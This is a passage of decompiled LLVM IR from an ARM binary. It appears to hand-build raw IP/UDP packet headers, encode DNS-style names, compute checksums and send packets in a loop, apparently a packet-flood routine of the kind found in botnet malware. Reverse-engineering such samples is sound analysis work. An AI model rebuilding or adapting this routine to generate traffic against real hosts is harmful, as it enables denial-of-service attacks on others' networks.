  store i32 %v3_e010, i32* %r4.global-to-local, align 4
  store i32 %v4_e098, i32* %r0.global-to-local, align 4
  %v0_e09c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e09c, label %.thread21, label %bb143

bb143:                                            ; preds = %dec_label_pc_e040
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_e0a0 = load i32, i32* %r1.global-to-local, align 4
  %v4_e0a0 = add i32 %v3_e0a0, 6
  %v5_e0a0 = inttoptr i32 %v4_e0a0 to i8*
  store i8 64, i8* %v5_e0a0, align 1
  %v0_e0a8.pre = load i32, i32* %r4.global-to-local, align 4
  %extract.t76 = trunc i32 %v0_e0a8.pre to i8
  br label %.thread21

.thread21:                                        ; preds = %dec_label_pc_e040, %bb143
  %v0_e0a8.off0 = phi i8 [ %extract.t, %dec_label_pc_e040 ], [ %extract.t76, %bb143 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_e0a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0a8 = add i32 %v2_e0a8, 3
  %v4_e0a8 = inttoptr i32 %v3_e0a8 to i8*
  store i8 %v0_e0a8.off0, i8* %v4_e0a8, align 1
  store i32 %v4_e0ac, i32* %ip.global-to-local, align 4
  store i32 %v4_e0b0, i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec7c.86 to i32), i32* %r4.global-to-local, align 4
  %v0_e0b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_e0b8 = trunc i32 %v0_e0b8 to i8
  %v2_e0b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0b8 = add i32 %v2_e0b8, 8
  %v4_e0b8 = inttoptr i32 %v3_e0b8 to i8*
  store i8 %v1_e0b8, i8* %v4_e0b8, align 1
  %v0_e0bc = load i32, i32* %r3.global-to-local, align 4
  %v1_e0bc = trunc i32 %v0_e0bc to i8
  %v2_e0bc = load i32, i32* %r1.global-to-local, align 4
  %v3_e0bc = add i32 %v2_e0bc, 9
  %v4_e0bc = inttoptr i32 %v3_e0bc to i8*
  store i8 %v1_e0bc, i8* %v4_e0bc, align 1
  %v0_e0c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_e0c0 = trunc i32 %v0_e0c0 to i8
  %v2_e0c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_e0c0 = add i32 %v2_e0c0, 5
  %v4_e0c0 = inttoptr i32 %v3_e0c0 to i8*
  store i8 %v1_e0c0, i8* %v4_e0c0, align 1
  %v0_e0c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e0c4, label %.thread22, label %bb144

.thread22:                                        ; preds = %.thread21
  %v2_e0c823 = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_e0c823, i32* %r3.global-to-local, align 4
  store i32 %v4_df8c, i32* %lr.global-to-local, align 4
  br label %bb145

bb144:                                            ; preds = %.thread21
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_e0c8 = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_e0c8, i32* %r3.global-to-local, align 4
  store i32 %v4_df8c, i32* %lr.global-to-local, align 4
  %v3_e0d0 = load i32, i32* %r1.global-to-local, align 4
  %v4_e0d0 = add i32 %v3_e0d0, 7
  %v5_e0d0 = inttoptr i32 %v4_e0d0 to i8*
  store i8 0, i8* %v5_e0d0, align 1
  %v0_e0d8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_e0dc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb145

bb145:                                            ; preds = %.thread22, %bb144
  %v0_e0dc = phi i32 [ %v2_e0c823, %.thread22 ], [ %v0_e0dc.pre, %bb144 ]
  %v0_e0d8 = phi i32 [ %v4_df8c, %.thread22 ], [ %v0_e0d8.pre, %bb144 ]
  %v0_e0d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_e0d4 = add i32 %v0_e0d8, 41
  %v2_e0d8 = add i32 %v1_e0d4, %v0_e0d4
  store i32 %v2_e0d8, i32* %r4.global-to-local, align 4
  %v2_e0dc = add i32 %v0_e0d4, 12
  %v3_e0dc = inttoptr i32 %v2_e0dc to i32*
  store i32 %v0_e0dc, i32* %v3_e0dc, align 4
  store i32 %v4_e0e0, i32* %r2.global-to-local, align 4
  store i32 %v4_e0e4, i32* %r3.global-to-local, align 4
  %v0_e0e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e0e8 = add i32 %v0_e0e8, 20
  store i32 %v1_e0e8, i32* %r0.global-to-local, align 4
  %v0_e0ec = load i32, i32* %ip.global-to-local, align 4
  %v1_e0ec = trunc i32 %v0_e0ec to i8
  %v3_e0ec = add i32 %v0_e0e8, 4
  %v4_e0ec = inttoptr i32 %v3_e0ec to i8*
  store i8 %v1_e0ec, i8* %v4_e0ec, align 1
  %v0_e0f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0f0 = trunc i32 %v0_e0f0 to i8
  %v2_e0f0 = load i32, i32* %r0.global-to-local, align 4
  %v3_e0f0 = add i32 %v2_e0f0, 5
  %v4_e0f0 = inttoptr i32 %v3_e0f0 to i8*
  store i8 %v1_e0f0, i8* %v4_e0f0, align 1
  %v0_e0f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e0f4 = trunc i32 %v0_e0f4 to i8
  %v2_e0f4 = load i32, i32* %r0.global-to-local, align 4
  %v3_e0f4 = add i32 %v2_e0f4, 3
  %v4_e0f4 = inttoptr i32 %v3_e0f4 to i8*
  store i8 %v1_e0f4, i8* %v4_e0f4, align 1
  %v0_e0f8 = load i32, i32* %sb.global-to-local, align 4
  %v1_e0f8 = trunc i32 %v0_e0f8 to i8
  %v2_e0f8 = load i32, i32* %r0.global-to-local, align 4
  %v3_e0f8 = add i32 %v2_e0f8, 2
  %v4_e0f8 = inttoptr i32 %v3_e0f8 to i8*
  store i8 %v1_e0f8, i8* %v4_e0f8, align 1
  %v0_e0fc = load i32, i32* %sl.global-to-local, align 4
  %v1_e0fc = trunc i32 %v0_e0fc to i8
  %v2_e0fc = load i32, i32* %r0.global-to-local, align 4
  %v3_e0fc = add i32 %v2_e0fc, 4
  %v4_e0fc = inttoptr i32 %v3_e0fc to i8*
  store i8 %v1_e0fc, i8* %v4_e0fc, align 1
  %v0_e100 = load i32, i32* @r5, align 4
  %v1_e100 = trunc i32 %v0_e100 to i8
  %v2_e100 = load i32, i32* %r1.global-to-local, align 4
  %v3_e100 = add i32 %v2_e100, 20
  %v4_e100 = inttoptr i32 %v3_e100 to i8*
  store i8 %v1_e100, i8* %v4_e100, align 1
  store i32 %v4_e108, i32* %r2.global-to-local, align 4
  %v1_e10c = load i32, i32* %r1.global-to-local, align 4
  %v2_e10c = add i32 %v1_e10c, 16
  %v3_e10c = inttoptr i32 %v2_e10c to i32*
  store i32 %stack_var_-2176.0, i32* %v3_e10c, align 4
  %v0_e110 = load i32, i32* %r2.global-to-local, align 4
  %v1_e110 = trunc i32 %v0_e110 to i8
  %v2_e110 = load i32, i32* %r0.global-to-local, align 4
  %v3_e110 = add i32 %v2_e110, 1
  %v4_e110 = inttoptr i32 %v3_e110 to i8*
  store i8 %v1_e110, i8* %v4_e110, align 1
  store i32 %v4_e114, i32* %lr.global-to-local, align 4
  store i32 %v4_df8c, i32* %r0.global-to-local, align 4
  %v0_e11c = load i32, i32* %r1.global-to-local, align 4
  %v1_e11c = add i32 %v0_e11c, 28
  store i32 %v1_e11c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_e128 = load i32, i32* %r8.global-to-local, align 4
  %v1_e128 = trunc i32 %v0_e128 to i8
  %v4_e128 = inttoptr i32 %v1_e11c to i8*
  store i8 %v1_e128, i8* %v4_e128, align 1
  %v0_e12c = load i32, i32* %r3.global-to-local, align 4
  %v1_e12c = trunc i32 %v0_e12c to i8
  %v2_e12c = load i32, i32* %ip.global-to-local, align 4
  %v3_e12c = add i32 %v2_e12c, 5
  %v4_e12c = inttoptr i32 %v3_e12c to i8*
  store i8 %v1_e12c, i8* %v4_e12c, align 1
  %v0_e130 = load i32, i32* %lr.global-to-local, align 4
  %v1_e130 = trunc i32 %v0_e130 to i8
  %v2_e130 = load i32, i32* %ip.global-to-local, align 4
  %v3_e130 = add i32 %v2_e130, 1
  %v4_e130 = inttoptr i32 %v3_e130 to i8*
  store i8 %v1_e130, i8* %v4_e130, align 1
  %v0_e134 = load i32, i32* %r3.global-to-local, align 4
  %v1_e134 = trunc i32 %v0_e134 to i8
  %v2_e134 = load i32, i32* %ip.global-to-local, align 4
  %v3_e134 = add i32 %v2_e134, 2
  %v4_e134 = inttoptr i32 %v3_e134 to i8*
  store i8 %v1_e134, i8* %v4_e134, align 1
  %v0_e138 = load i32, i32* @r6, align 4
  %v1_e138 = trunc i32 %v0_e138 to i8
  %v2_e138 = load i32, i32* %ip.global-to-local, align 4
  %v3_e138 = add i32 %v2_e138, 3
  %v4_e138 = inttoptr i32 %v3_e138 to i8*
  store i8 %v1_e138, i8* %v4_e138, align 1
  %v0_e13c = load i32, i32* @r6, align 4
  %v1_e13c = trunc i32 %v0_e13c to i8
  %v2_e13c = load i32, i32* %ip.global-to-local, align 4
  %v3_e13c = add i32 %v2_e13c, 4
  %v4_e13c = inttoptr i32 %v3_e13c to i8*
  store i8 %v1_e13c, i8* %v4_e13c, align 1
  %v0_e140 = load i32, i32* %r0.global-to-local, align 4
  %v1_e140 = trunc i32 %v0_e140 to i8
  %v2_e140 = load i32, i32* %r1.global-to-local, align 4
  %v3_e140 = add i32 %v2_e140, 40
  %v4_e140 = inttoptr i32 %v3_e140 to i8*
  store i8 %v1_e140, i8* %v4_e140, align 1
  store i32 %v6_dd94, i32* %r1.global-to-local, align 4
  %v0_e148 = load i32, i32* @r7, align 4
  store i32 %v0_e148, i32* %r2.global-to-local, align 4
  %v0_e14c = load i32, i32* %r4.global-to-local, align 4
  %v1_e14c = add i32 %v0_e14c, 1
  store i32 %v1_e14c, i32* %r0.global-to-local, align 4
  %v3_e150 = call i32 @function_12d10(i32 %v1_e14c, i32 %v6_dd94, i32 %v0_e148)
  store i32 %v3_e150, i32* %r0.global-to-local, align 4
  store i32 %v2_dee0, i32* %r1.global-to-local, align 4
  %v1_e158 = load i32, i32* @r6, align 4
  %v9_e158 = icmp eq i32 %v2_dee0, %v1_e158
  store i1 %v9_e158, i1* %cpsr_z.global-to-local, align 1
  %v7_e15c = icmp sgt i32 %v2_dee0, %v1_e158
  store i32 %v1_e158, i32* %lr.global-to-local, align 4
  %v0_e16c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e16c, i32* %r2.global-to-local, align 4
  %extract.t78 = trunc i32 %v1_e158 to i8
  br i1 %v7_e15c, label %dec_label_pc_e168, label %dec_label_pc_e1a8

dec_label_pc_e168:                                ; preds = %bb145
  store i32 %v1_e158, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e174

dec_label_pc_e174:                                ; preds = %bb148, %dec_label_pc_e168
  %v0_e19085151 = phi i32 [ %v0_e19085152, %bb148 ], [ %v1_e158, %dec_label_pc_e168 ]
  %v1_e18433 = phi i32 [ %v1_e19491, %bb148 ], [ %v1_e158, %dec_label_pc_e168 ]
  %v1_e180.off0 = phi i8 [ %v1_e18056.off0, %bb148 ], [ %extract.t78, %dec_label_pc_e168 ]
  %v0_e18432 = phi i32 [ %v0_e184325488, %bb148 ], [ %v0_e16c, %dec_label_pc_e168 ]
  store i32 %v6_dd94, i32* %ip.global-to-local, align 4
  %v2_e178 = add i32 %v1_e18433, %v6_dd94
  %v3_e178 = inttoptr i32 %v2_e178 to i8*
  %v4_e178 = load i8, i8* %v3_e178, align 1
  %v6_e178 = zext i8 %v4_e178 to i32
  store i32 %v6_e178, i32* %r3.global-to-local, align 4
  %v7_e17c = icmp eq i8 %v4_e178, 46
  store i1 %v7_e17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e17c, label %bb146, label %.thread31

.thread31:                                        ; preds = %dec_label_pc_e174
  %v2_e18434 = add i32 %v1_e18433, %v0_e18432
  store i32 %v2_e18434, i32* %r0.global-to-local, align 4
  br label %.thread35

bb146:                                            ; preds = %dec_label_pc_e174
  %v3_e180 = load i32, i32* %r2.global-to-local, align 4
  %v4_e180 = inttoptr i32 %v3_e180 to i8*
  store i8 %v1_e180.off0, i8* %v4_e180, align 1
  %v0_e188.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_e184 = load i32, i32* %r4.global-to-local, align 4
  %v1_e184 = load i32, i32* %r1.global-to-local, align 4
  %v2_e184 = add i32 %v1_e184, %v0_e184
  store i32 %v2_e184, i32* %r0.global-to-local, align 4
  br i1 %v0_e188.pr, label %bb147, label %bb146..thread35_crit_edge

bb146..thread35_crit_edge:                        ; preds = %bb146
  %v0_e19085.pre = load i32, i32* %lr.global-to-local, align 4
  br label %.thread35

bb147:                                            ; preds = %bb146
  %v2_e188 = add i32 %v2_e184, 1
  store i32 %v2_e188, i32* %r2.global-to-local, align 4
  store i32 %v2_dee0, i32* %r0.global-to-local, align 4
  %v0_e190 = load i32, i32* %lr.global-to-local, align 4
  %v1_e190 = add i32 %v0_e190, 1
  store i32 %v1_e190, i32* %ip.global-to-local, align 4
  %v1_e194 = add i32 %v1_e184, 1
  store i32 %v1_e194, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %bb148

.thread35:                                        ; preds = %bb146..thread35_crit_edge, %.thread31
  %v0_e19085 = phi i32 [ %v0_e19085.pre, %bb146..thread35_crit_edge ], [ %v0_e19085151, %.thread31 ]
  %v0_e194.ph = phi i32 [ %v1_e184, %bb146..thread35_crit_edge ], [ %v1_e18433, %.thread31 ]
  %v0_e1843254.ph = phi i32 [ %v0_e184, %bb146..thread35_crit_edge ], [ %v0_e18432, %.thread31 ]
  store i32 %v2_dee0, i32* %r0.global-to-local, align 4
  %v1_e19086 = add i32 %v0_e19085, 1
  store i32 %v1_e19086, i32* %ip.global-to-local, align 4
  %v1_e19487 = add i32 %v0_e194.ph, 1
  store i32 %v1_e19487, i32* %r1.global-to-local, align 4
  %v2_e19c = urem i32 %v1_e19086, 256
  store i32 %v2_e19c, i32* %lr.global-to-local, align 4
  %extract.t81 = trunc i32 %v1_e19086 to i8
  br label %bb148

bb148:                                            ; preds = %bb147, %.thread35
  %v0_e19085152 = phi i32 [ 0, %bb147 ], [ %v2_e19c, %.thread35 ]
  %v1_e19491 = phi i32 [ %v1_e194, %bb147 ], [ %v1_e19487, %.thread35 ]
  %v0_e184325488 = phi i32 [ %v0_e184, %bb147 ], [ %v0_e1843254.ph, %.thread35 ]
  %v1_e18056.off0 = phi i8 [ 0, %bb147 ], [ %extract.t81, %.thread35 ]
  %v9_e1a0 = icmp eq i32 %v2_dee0, %v1_e19491
  store i1 %v9_e1a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e1a0, label %dec_label_pc_e1a8.loopexit, label %dec_label_pc_e174

dec_label_pc_e1a8.loopexit:                       ; preds = %bb148
  %v2_e1a8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e1a8

dec_label_pc_e1a8:                                ; preds = %dec_label_pc_e1a8.loopexit, %bb145
  %v2_e1a8 = phi i32 [ %v2_e1a8.pre, %dec_label_pc_e1a8.loopexit ], [ %v0_e16c, %bb145 ]
  %v0_e1a8.off0 = phi i8 [ %v1_e18056.off0, %dec_label_pc_e1a8.loopexit ], [ %extract.t78, %bb145 ]
  %v3_e1a8 = inttoptr i32 %v2_e1a8 to i8*
  store i8 %v0_e1a8.off0, i8* %v3_e1a8, align 1
  %v3_e1ac = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_dee0, i32* %r1.global-to-local, align 4
  %v0_e1b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_e1b4 = add i32 %v0_e1b4, %v2_dee0
  store i32 %v2_e1b4, i32* %r3.global-to-local, align 4
  %v1_e1b8 = add i32 %v3_e1ac, 1
  store i32 %v1_e1b8, i32* @r4, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* @lr, align 4
  %v9_e1c8 = icmp eq i32 %v1_dc80, %v1_e1b8
  store i1 %v9_e1c8, i1* %cpsr_z.global-to-local, align 1
  %v1_e1cc = add i32 %v2_e1b4, 2
  store i32 %v1_e1cc, i32* %r2.global-to-local, align 4
  %v4_e1d0 = inttoptr i32 %v1_e1cc to i8*
  store i8 0, i8* %v4_e1d0, align 1
  %v0_e1d4 = load i32, i32* @lr, align 4
  %v1_e1d4 = trunc i32 %v0_e1d4 to i8
  %v2_e1d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_e1d4 = add i32 %v2_e1d4, 3
  %v4_e1d4 = inttoptr i32 %v3_e1d4 to i8*
  store i8 %v1_e1d4, i8* %v4_e1d4, align 1
  %v0_e1d8 = load i32, i32* @lr, align 4
  %v1_e1d8 = trunc i32 %v0_e1d8 to i8
  %v2_e1d8 = load i32, i32* %r2.global-to-local, align 4
  %v3_e1d8 = add i32 %v2_e1d8, 1
  %v4_e1d8 = inttoptr i32 %v3_e1d8 to i8*
  store i8 %v1_e1d8, i8* %v4_e1d8, align 1
  %v0_e1dc = load i32, i32* %ip.global-to-local, align 4
  %v1_e1dc = trunc i32 %v0_e1dc to i8
  %v2_e1dc = load i32, i32* %r2.global-to-local, align 4
  %v3_e1dc = add i32 %v2_e1dc, 2
  %v4_e1dc = inttoptr i32 %v3_e1dc to i8*
  store i8 %v1_e1dc, i8* %v4_e1dc, align 1
  %v0_e1e0 = load i32, i32* @r4, align 4
  store i32 %v0_e1e0, i32* %stack_var_-40, align 4
  %v8_e1e4 = icmp sgt i32 %v1_dc80, %v1_e1b8
  br i1 %v8_e1e4, label %dec_label_pc_e040, label %dec_label_pc_e1e8

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1a8, %dec_label_pc_e3b4
  %v4_e258.pre-phi = phi i32 [ %v4_e3b8, %dec_label_pc_e3b4 ], [ %v4_df8c, %dec_label_pc_e1a8 ]
  store i32 %v1_dc80, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_df64, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e1f4

dec_label_pc_e1f4:                                ; preds = %dec_label_pc_e1f4, %dec_label_pc_e318, %dec_label_pc_e1e8
  br i1 %v2_df64, label %dec_label_pc_e1f4, label %dec_label_pc_e1f8

dec_label_pc_e1f8:                                ; preds = %dec_label_pc_e1f4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r6, align 4
  %v0_e208 = load i32, i32* @fp, align 4
  %v1_e208 = add i32 %v0_e208, 27
  store i32 %v1_e208, i32* @sb, align 4
  %v1_e20c = add i32 %v0_e208, 47
  store i32 %v1_e20c, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_e214

dec_label_pc_e214:                                ; preds = %dec_label_pc_e254.dec_label_pc_e214_crit_edge, %dec_label_pc_e1f8
  %v1_e234 = phi i32 [ %v1_e220.pre, %dec_label_pc_e254.dec_label_pc_e214_crit_edge ], [ 65535, %dec_label_pc_e1f8 ]
  %v1_e21c = phi i32 [ %v1_e304, %dec_label_pc_e254.dec_label_pc_e214_crit_edge ], [ 0, %dec_label_pc_e1f8 ]
  store i32 %v2_dc98, i32* %r3.global-to-local, align 4
  store i32 %v3_df54, i32* %r8.global-to-local, align 4
  %v4_e21c = mul i32 %v1_e21c, 4
  %v5_e21c = add i32 %v4_e21c, %v2_dc98
  %v6_e21c = inttoptr i32 %v5_e21c to i32*
  %v7_e21c = load i32, i32* %v6_e21c, align 4
  store i32 %v7_e21c, i32* @r4, align 4
  %v9_e220 = icmp eq i32 %v3_df54, %v1_e234
  store i1 %v9_e220, i1* %cpsr_z.global-to-local, align 1
  %v1_e224 = add i32 %v7_e21c, 20
  store i32 %v1_e224, i32* @r5, align 4
  %v1_e228 = add i32 %v7_e21c, 28
  store i32 %v1_e228, i32* @r8, align 4
  br i1 %v9_e220, label %dec_label_pc_e328, label %dec_label_pc_e230

dec_label_pc_e230:                                ; preds = %dec_label_pc_e214
  store i32 %v3_df58, i32* %ip.global-to-local, align 4
  %v9_e234 = icmp eq i32 %v3_df58, %v1_e234
  store i1 %v9_e234, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e234, label %dec_label_pc_e344, label %dec_label_pc_e23c

dec_label_pc_e23c:                                ; preds = %dec_label_pc_e328.dec_label_pc_e23c_crit_edge, %dec_label_pc_e230
  %v1_e240 = phi i32 [ %v1_e240.pre, %dec_label_pc_e328.dec_label_pc_e23c_crit_edge ], [ %v1_e234, %dec_label_pc_e230 ]
  store i32 %v3_df5c, i32* @lr, align 4
  %v9_e240 = icmp eq i32 %v3_df5c, %v1_e240
  store i1 %v9_e240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e240, label %dec_label_pc_e360, label %dec_label_pc_e248

dec_label_pc_e248:                                ; preds = %dec_label_pc_e344.dec_label_pc_e248_crit_edge, %dec_label_pc_e23c
  %v1_e24c = phi i32 [ %v1_e24c.pre, %dec_label_pc_e344.dec_label_pc_e248_crit_edge ], [ %v1_e240, %dec_label_pc_e23c ]
  store i32 %v3_df60, i32* %r0.global-to-local, align 4
  %v9_e24c = icmp eq i32 %v3_df60, %v1_e24c
  store i1 %v9_e24c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e24c, label %dec_label_pc_e37c, label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %dec_label_pc_e360, %dec_label_pc_e248, %dec_label_pc_e37c
  %v0_e254 = load i32, i32* @r4, align 4
  %v1_e254 = add i32 %v0_e254, 41
  store i32 %v1_e254, i32* %r0.global-to-local, align 4
  store i32 %v4_e258.pre-phi, i32* %r1.global-to-local, align 4
  %v2_e25c = call i32 @function_ff14(i32 %v1_e254, i32 %v4_e258.pre-phi)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_e264 = load i32, i32* @r7, align 4
  %v1_e264 = trunc i32 %v0_e264 to i8
  %v2_e264 = load i32, i32* @r4, align 4
  %v3_e264 = add i32 %v2_e264, 10
  %v4_e264 = inttoptr i32 %v3_e264 to i8*
  store i8 %v1_e264, i8* %v4_e264, align 1
  %v0_e268 = load i32, i32* @r7, align 4
  %v1_e268 = trunc i32 %v0_e268 to i8
  %v2_e268 = load i32, i32* @r4, align 4
  %v3_e268 = add i32 %v2_e268, 11
  %v4_e268 = inttoptr i32 %v3_e268 to i8*
  store i8 %v1_e268, i8* %v4_e268, align 1
  %v0_e26c = load i32, i32* @r4, align 4
  store i32 %v0_e26c, i32* @r0, align 4
  %v2_e270 = call i32 @function_e424(i32 %v0_e26c, i32 20)
  %v3_e270 = trunc i32 %v2_e270 to i8
  store i32 %v2_e270, i32* %r0.global-to-local, align 4
  %v4_e274 = sdiv i32 %v2_e270, 256
  store i32 %v4_e274, i32* %r3.global-to-local, align 4
  %v1_e278 = trunc i32 %v4_e274 to i8
  %v2_e278 = load i32, i32* @r4, align 4
  %v3_e278 = add i32 %v2_e278, 11
  %v4_e278 = inttoptr i32 %v3_e278 to i8*
  store i8 %v1_e278, i8* %v4_e278, align 1
  %v3_e27c = load i32, i32* @r4, align 4
  %v4_e27c = add i32 %v3_e27c, 10
  %v5_e27c = inttoptr i32 %v4_e27c to i8*
  store i8 %v3_e270, i8* %v5_e27c, align 1
  %v0_e280 = load i32, i32* @r7, align 4
  %v1_e280 = trunc i32 %v0_e280 to i8
  %v2_e280 = load i32, i32* @r5, align 4
  %v3_e280 = add i32 %v2_e280, 6
  %v4_e280 = inttoptr i32 %v3_e280 to i8*
  store i8 %v1_e280, i8* %v4_e280, align 1
  %v0_e284 = load i32, i32* @r7, align 4
  %v1_e284 = trunc i32 %v0_e284 to i8
  %v2_e284 = load i32, i32* @r5, align 4
  %v3_e284 = add i32 %v2_e284, 7
  %v4_e284 = inttoptr i32 %v3_e284 to i8*
  store i8 %v1_e284, i8* %v4_e284, align 1
  %v0_e288 = load i32, i32* @r4, align 4
  %v1_e288 = add i32 %v0_e288, 24
  %v2_e288 = inttoptr i32 %v1_e288 to i8*
  %v3_e288 = load i8, i8* %v2_e288, align 1
  %v4_e288 = zext i8 %v3_e288 to i32
  store i32 %v4_e288, i32* %r3.global-to-local, align 4
  %v1_e28c = add i32 %v0_e288, 25
  %v2_e28c = inttoptr i32 %v1_e28c to i8*
  %v3_e28c = load i8, i8* %v2_e28c, align 1
  %v4_e28c = zext i8 %v3_e28c to i32
  %v0_e290 = load i32, i32* @r5, align 4
  store i32 %v0_e290, i32* @r1, align 4
  %v4_e294 = mul nuw nsw i32 %v4_e28c, 256
  %v5_e294 = or i32 %v4_e294, %v4_e288
  store i32 %v5_e294, i32* %r2.global-to-local, align 4
  store i32 %v0_e288, i32* %r0.global-to-local, align 4
  %v0_e29c = load i32, i32* @sb, align 4
  store i32 %v0_e29c, i32* %r3.global-to-local, align 4
  %v4_e2a0 = call i32 @function_e480(i32 %v0_e288, i32 %v0_e290, i32 %v5_e294, i32 %v0_e29c)
  %v5_e2a0 = trunc i32 %v4_e2a0 to i8
  store i32 %v4_e2a0, i32* %r0.global-to-local, align 4
  %v3_e2a4 = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-2176.0, i32* %r2.global-to-local, align 4
  %v5_e2b4 = mul i32 %v3_e2a4, 24
  %v2_e2b8 = add i32 %v5_e2b4, %arg2
  store i32 %v2_e2b8, i32* %lr.global-to-local, align 4
  %v4_e2bc = sdiv i32 %v4_e2a0, 256
  store i32 %v4_e2bc, i32* %r3.global-to-local, align 4
  %v3_e2c0 = load i32, i32* @r5, align 4
  %v4_e2c0 = add i32 %v3_e2c0, 6
  %v5_e2c0 = inttoptr i32 %v4_e2c0 to i8*
  store i8 %v5_e2a0, i8* %v5_e2c0, align 1
  %v0_e2c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2c4 = trunc i32 %v0_e2c4 to i8
  %v2_e2c4 = load i32, i32* @r5, align 4
  %v3_e2c4 = add i32 %v2_e2c4, 7
  %v4_e2c4 = inttoptr i32 %v3_e2c4 to i8*
  store i8 %v1_e2c4, i8* %v4_e2c4, align 1
  %v0_e2c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2c8 = load i32, i32* %lr.global-to-local, align 4
  %v2_e2c8 = add i32 %v1_e2c8, 4
  %v3_e2c8 = inttoptr i32 %v2_e2c8 to i32*
  store i32 %v0_e2c8, i32* %v3_e2c8, align 4
  %v0_e2cc = load i32, i32* @r4, align 4
  %v1_e2cc = add i32 %v0_e2cc, 20
  %v2_e2cc = inttoptr i32 %v1_e2cc to i32*
  %v3_e2cc = load i32, i32* %v2_e2cc, align 4
  %v3_e2d0 = udiv i32 %v3_e2cc, 65536
  store i32 %v3_e2d0, i32* %r3.global-to-local, align 4
  %v3_e2d412 = udiv i32 %v3_e2cc, 16777216
  %v1_e2d8 = trunc i32 %v3_e2d412 to i8
  %v2_e2d8 = load i32, i32* %lr.global-to-local, align 4
  %v3_e2d8 = add i32 %v2_e2d8, 3
  %v4_e2d8 = inttoptr i32 %v3_e2d8 to i8*
  store i8 %v1_e2d8, i8* %v4_e2d8, align 1
  %v0_e2dc = load i32, i32* %r3.global-to-local, align 4
  %v1_e2dc = trunc i32 %v0_e2dc to i8
  %v2_e2dc = load i32, i32* %lr.global-to-local, align 4
  %v3_e2dc = add i32 %v2_e2dc, 2
  %v4_e2dc = inttoptr i32 %v3_e2dc to i8*
  store i8 %v1_e2dc, i8* %v4_e2dc, align 1
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e2e8 = load i32, i32* @r4, align 4
  store i32 %v0_e2e8, i32* %r1.global-to-local, align 4
  store i32 %v3_def4, i32* %r0.global-to-local, align 4
  %v0_e2f0 = load i32, i32* @sl, align 4
  store i32 %v0_e2f0, i32* %r2.global-to-local, align 4
  %v0_e2f4 = load i32, i32* %lr.global-to-local, align 4
  %v6_e2fc = inttoptr i32 %v0_e2e8 to i32*
  %v7_e2fc = call i32 @function_13eec(i32 %v3_def4, i32* %v6_e2fc, i32 %v0_e2f0, i32 16384, i32 %v0_e2f4, i32 16)
  %v3_e300 = load i32, i32* %stack_var_-40, align 4
  %v1_e304 = add i32 %v3_e300, 1
  store i32 %v1_e304, i32* %r0.global-to-local, align 4
  store i32 %v1_dc80, i32* %r3.global-to-local, align 4
  %v9_e30c = icmp eq i32 %v1_dc80, %v1_e304
  store i1 %v9_e30c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e304, i32* %stack_var_-40, align 4
  %v8_e314 = icmp sgt i32 %v1_dc80, %v1_e304
  br i1 %v8_e314, label %dec_label_pc_e254.dec_label_pc_e214_crit_edge, label %dec_label_pc_e318

dec_label_pc_e254.dec_label_pc_e214_crit_edge:    ; preds = %dec_label_pc_e254
  %v1_e220.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e214

dec_label_pc_e318:                                ; preds = %dec_label_pc_e254
  store i32 %v1_dc80, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e1f4

dec_label_pc_e328:                                ; preds = %dec_label_pc_e214
  %v0_e328 = call i32 @function_fe60()
  %v1_e328 = trunc i32 %v0_e328 to i8
  store i32 %v0_e328, i32* %r0.global-to-local, align 4
  store i32 %v3_df58, i32* %ip.global-to-local, align 4
  %v4_e330 = sdiv i32 %v0_e328, 256
  store i32 %v4_e330, i32* %r3.global-to-local, align 4
